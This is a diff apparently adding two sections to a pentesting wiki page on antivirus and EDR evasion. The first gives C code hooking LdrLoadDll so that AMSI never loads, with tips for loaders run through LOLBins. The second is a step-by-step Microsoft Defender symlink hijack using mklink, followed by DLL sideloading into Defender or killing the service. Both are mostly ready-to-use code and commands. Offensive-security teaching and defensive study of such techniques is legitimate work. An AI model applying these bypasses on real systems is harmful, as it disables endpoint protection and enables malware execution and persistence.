@@ -275,7 +275,42 @@ This technique was initially discovered by [@RastaMouse](https://twitter.com/_Ra
 
 There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
+### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)
+
+AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.
+
+Implementation outline (x64 C/C++ pseudocode):
+```c
+#include <windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
+static pLdrLoadDll realLdrLoadDll;
+
+NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
+    if (module && module->Buffer){
+        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
+        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
+            // Pretend the DLL cannot be found → AMSI never initialises in this process
+            return STATUS_DLL_NOT_FOUND; // 0xC0000135
+        }
+    }
+    return realLdrLoadDll(path, flags, module, handle);
+}
+
+void InstallHook(){
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
+    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
+    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
+}
+```
+Notes
+- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
+- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
+- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).
+
+This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
 
 **Remove the detected signature**
 
@@ -892,6 +927,54 @@ References for PPL and tooling
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
+## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
+
+Windows Defender chooses the platform it runs from by enumerating subfolders under:
+- `C:\ProgramData\Microsoft\Windows Defender\Platform\`
+
+It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.
+
+Preconditions
+- Local Administrator (needed to create directories/symlinks under the Platform folder)
+- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
+- Only built-in tools required (mklink)
+
+Why it works
+- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.
+
+Step-by-step (example)
+1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
+```cmd
+set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
+set DST="C:\TMP\AV"
+robocopy %SRC% %DST% /MIR
+```
+2) Create a higher-version directory symlink inside Platform pointing to your folder:
+```cmd
+mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
+```
+3) Trigger selection (reboot recommended):
+```cmd
+shutdown /r /t 0
+```
+4) Verify MsMpEng.exe (WinDefend) runs from the redirected path:
+```powershell
+Get-Process MsMpEng | Select-Object Id,Path
+# or
+wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
+```
+You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.
+
+Post-exploitation options
+- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
+```cmd
+rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
+```
+
+> [!TIP]
+> Note that This technique does not provide privilege escalation by itself; it requires admin rights.
+
 ## References
 
 - [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
@@ -905,5 +988,9 @@ References for PPL and tooling
 - [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
+- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
+- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
+
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 
 {{#include ../banners/hacktricks-training.md}}
